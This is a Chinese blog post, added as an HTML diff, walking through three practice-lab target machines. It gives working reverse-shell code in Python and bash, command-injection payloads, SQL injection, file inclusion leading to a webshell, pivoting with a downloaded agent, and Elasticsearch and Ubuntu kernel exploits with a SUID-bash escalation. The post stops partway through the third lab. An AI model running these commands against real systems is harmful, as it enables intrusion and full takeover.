@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>20.1-打靶2 | lanceplm</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+ 
+  
+    <link rel="icon" href="/../img/icon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle"></a>
+        
+          <a class="main-nav-link" href="/">首页</a>
+        
+          <a class="main-nav-link" href="/archives">归档</a>
+        
+          <a class="main-nav-link" href="/about">关于</a>
+        
+          <a class="main-nav-link" href="/board">留言</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-20.1-打靶2" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="name">
+      20.1-打靶2
+    </h1>
+  
+
+        <div class="article-meta">
+          <a href="/2024/01/23/20.1-%E6%89%93%E9%9D%B62/" class="article-date">
+  <time datetime="2024-01-23T07:57:49.870Z" itemprop="datePublished">2024-01-23</time>
+</a>
+          
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="靶场1"><a href="#靶场1" class="headerlink" title="靶场1"></a>靶场1</h3><p>查看靶机MAC地址</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240123161632722.png" alt="image-20240123161632722"></p>
+<p>kali中执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifdown eth0</span><br><span class="line">ifup eth0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240123162044045.png" alt="image-20240123162044045"></p>
+<p>查询eth0下的ip，根据MAC地址查看靶机ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l -I eth0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240123162203725.png" alt="image-20240123162203725"></p>
+<p>发现MAC地址，MAC地址刚刚在最上面查看到了。</p>
+<p>扫端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- &quot;192.168.56.101&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240123155821382.png" alt="image-20240123155821382"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.101:5000/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240123155851378.png" alt="image-20240123155851378"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 5000 -sV 192.168.56.101</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124091622249.png" alt="image-20240124091622249"></p>
+<p>扫目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u &quot;192.168.56.101:5000&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240123160557604.png" alt="image-20240123160557604"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.101:5000/admin</span><br></pre></td></tr></table></figure>
+
+<p>​	<img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240123160631936.png" alt="image-20240123160631936"></p>
+<p>查询发现5000端口是为了一些应用来运行的端口。</p>
+<p>kaii监听4444端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124092012048.png" alt="image-20240124092012048"></p>
+<p>网站内端口反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import socket,os,subprocess</span><br><span class="line">RHOST=&#x27;192.168.56.102&#x27;# Change it</span><br><span class="line">RPORT=4444# Change it</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)# 创建一个TCP-socket对象</span><br><span class="line">s.connect((RHOST,RPORT))    # 连接攻击者</span><br><span class="line">os.dup2(s.fileno(),0)       # 复制链接符</span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line">p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])# 创建子进程调用SHELL </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124092319638.png" alt="image-20240124092319638"></p>
+<p>监听成功</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124092341239.png" alt="image-20240124092341239"></p>
+<p>在该服务发现是在doctor容器之下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124092521348.png" alt="image-20240124092521348"></p>
+<p>发现其他ip</p>
+<p>加固shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line">ctrl +z </span><br><span class="line">stty raw -echo;fg;rest </span><br></pre></td></tr></table></figure>
+
+<p>下载Venom v1.1.0</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x ./*</span><br></pre></td></tr></table></figure>
+
+<p>给该目录下所有文件添加权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124095915790.png" alt="image-20240124095915790"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./admin_linux_x64 -lport 9999</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124100558086.png" alt="image-20240124100558086"></p>
+<p>在shell中运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.56.102:80/agent_linux_x86</span><br></pre></td></tr></table></figure>
+
+<p>下载马</p>
+<p>给予执行权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x ./*</span><br></pre></td></tr></table></figure>
+
+<p>运行一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./agent_linux_x86 -rhost 192.168.56.102 -rport 9999</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124100902542.png" alt="image-20240124100902542"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124102334377.png" alt="image-20240124102334377"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124102349504.png" alt="image-20240124102349504"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">goto 1</span><br><span class="line">socks 1090</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124102648731.png" alt="image-20240124102648731"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf  </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124102830269.png" alt="image-20240124102830269"></p>
+<p>拉到最下面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 127.0.0.1 1090</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124144146915.png" alt="image-20240124144146915"></p>
+<p>扫描3个ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -Pn -sT -sV 172.17.0.1</span><br><span class="line">proxychains nmap -Pn -sT -sV 172.17.0.2</span><br><span class="line">proxychains nmap -Pn -sT -sV 172.17.0.3</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124144324893.png" alt="image-20240124144324893"></p>
+<p>发现.2ip出现了一个9200端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Elasticsearch</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124103033622.png" alt="image-20240124103033622"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locate 36337.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124103153163.png" alt="image-20240124103153163"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/remote/36337.py .</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x ./*</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124103459743.png" alt="image-20240124103459743"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q python2 36337.py 172.17.0.2</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124150517385.png" alt="image-20240124150517385"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124150624711.png" alt="image-20240124150624711"></p>
+<p>发现passwords</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat passwords</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124150748000.png" alt="image-20240124150748000"></p>
+<p>解码john的密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3f8184a7343664553fcb5337a3138814</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1337hack</span><br></pre></td></tr></table></figure>
+
+<p>进行远程连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh john@192.168.56.102</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124151812060.png" alt="image-20240124151812060"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124151849594.png" alt="image-20240124151849594"></p>
+<p>提权失败，说明john没有权利</p>
+<p>尝试内核提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124151956731.png" alt="image-20240124151956731"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124152130244.png" alt="image-20240124152130244"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locate 37292.c</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124152240013.png" alt="image-20240124152240013"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124152258100.png" alt="image-20240124152258100"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o exp 37292.c</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124152347724.png" alt="image-20240124152347724"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locate ofs-lib.so</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124152425046.png" alt="image-20240124152425046"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/metasploit-framework/data/exploits/CVE-2015-1328/ofs-lib.so .</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124152516047.png" alt="image-20240124152516047"></p>
+<p>kali主机在tmp目录启动http server</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.56.102/exp1</span><br><span class="line">wget http://192.168.56.102/ofs-lib.so</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124153532817.png" alt="image-20240124153532817"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124153602426.png" alt="image-20240124153602426"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x exp1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./exp1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124153744576.png" alt="image-20240124153744576"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124153825744.png" alt="image-20240124153825744"></p>
+<h3 id="靶场2"><a href="#靶场2" class="headerlink" title="靶场2"></a>靶场2</h3><p>查看靶机mac地址</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124155508821.png" alt="image-20240124155508821"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l -I eth0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124155713797.png" alt="image-20240124155713797"></p>
+<p>确定靶机ip为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.56.103</span><br></pre></td></tr></table></figure>
+
+<p>扫端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.56.103</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124155918421.png" alt="image-20240124155918421"></p>
+<p>发现22和8080端口开着</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 22,8080 -sV 192.168.56.103</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124160122414.png" alt="image-20240124160122414"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.103:8080/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124160253405.png" alt="image-20240124160253405"></p>
+<p>扫目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u 192.168.56.103:8080 -r</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.56.101:8080/console</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124160510705.png" alt="image-20240124160510705"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;union select 1--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124163556670.png" alt="image-20240124163556670"></p>
+<p>运行该代码可进入后台</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124163625485.png" alt="image-20240124163625485"></p>
+<p>该页面是查询上面几个文件是否含有病毒</p>
+<p>输入cat</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124163811445.png" alt="image-20240124163811445"></p>
+<p>看到输出了对于这个软件的病毒查杀</p>
+<p>那么它的运行情况便是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">应用程序+条件+需查杀程序</span><br></pre></td></tr></table></figure>
+
+<p>因为这是一个linux系统我们可以一起执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|ls -al</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124164407527.png" alt="image-20240124164407527"></p>
+<p>可以看到该目录下有这些文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">total 24</span><br><span class="line">drwxrwxr-x 4 scanner scanner 4096 Oct 24  2018 .</span><br><span class="line">drwxr-xr-x 6 scanner scanner 4096 Oct 24  2018 ..</span><br><span class="line">-rw-rw-r-- 1 scanner scanner 1550 Oct 24  2018 app.py</span><br><span class="line">-rw-r--r-- 1 scanner scanner 2048 Oct 21  2018 database.sql</span><br><span class="line">drwxrwxr-x 2 scanner scanner 4096 Oct 21  2018 samples</span><br><span class="line">drwxrwxr-x 2 scanner scanner 4096 Oct 21  2018 templates</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|pwd</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/scanner/cloudav_app</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124165101286.png" alt="image-20240124165101286"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;bash -c &#x27;exec bash -i &gt;&amp; /dev/tcp/192.168.56.102/4444 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;192.168.56.102&#x27;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br></pre></td></tr></table></figure>
+
+<p>反弹shell</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124172905505.png" alt="image-20240124172905505"></p>
+<p>kali进行监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124172950825.png" alt="image-20240124172950825"></p>
+<p>加固shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line">ctrl +z </span><br><span class="line">stty raw -echo;fg;rest </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240124173927332.png" alt="image-20240124173927332"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -u=s -exec ls -al &#123;&#125; \; 2&gt; /dev/null</span><br><span class="line">/home/scanner/update_cloudav &quot;-h | cp /bin/bash /tmp/bash;chmod 4777 /tmp/bash&quot;</span><br><span class="line">cd /tmp</span><br><span class="line">./bash -ps</span><br></pre></td></tr></table></figure>
+
+<h3 id="靶机3"><a href="#靶机3" class="headerlink" title="靶机3"></a>靶机3</h3><p>查看mac地址</p>
+<p><img src="/%E6%89%93%E9%9D%B6.assets/image-20240125191048968.png" alt="image-20240125191048968">s</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l -I eth0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125191138999.png" alt="image-20240125191138999"></p>
+<p>确定ip为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.56.101</span><br></pre></td></tr></table></figure>
+
+<p>扫端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.56.101</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125191257322.png" alt="image-20240125191257322"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">22/tcp   open  ssh</span><br><span class="line">8000/tcp open  http-alt</span><br><span class="line">9000/tcp open  cslistener</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.101:8000/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125191447919.png" alt="image-20240125191447919"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.101:9000/#/auth</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125191524422.png" alt="image-20240125191524422"></p>
+<p>在<a target="_blank" rel="noopener" href="http://192.168.56.101:8000/%E4%B8%8B%E8%BE%93%E5%85%A5">http://192.168.56.101:8000/下输入</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;start&#125;</span><br></pre></td></tr></table></figure>
+
+<p>并enter</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125192210228.png" alt="image-20240125192210228"></p>
+<p>网站喊我们去80端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.56.101:80</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125192307088.png" alt="image-20240125192307088"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125192821953.png" alt="image-20240125192821953"></p>
+<p>疑似文件包含漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.101/?file=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125192808992.png" alt="image-20240125192808992"></p>
+<p>kali开启网络服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+<p>在网络开启目录下创建一个txt.txt文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125193341155.png" alt="image-20240125193341155"></p>
+<p>输入该文件目录，查看是否成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.101/?file=http://192.168.56.102:80/txt.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125193537137.png" alt="image-20240125193537137"></p>
+<p>成功显示</p>
+<p>将txt.txt文件内容修改为蚁剑一句话木马</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125193817749.png" alt="image-20240125193817749"></p>
+<p>蚁剑连接shell</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125194127499.png" alt="image-20240125194127499"></p>
+<p>查看文件目录</p>
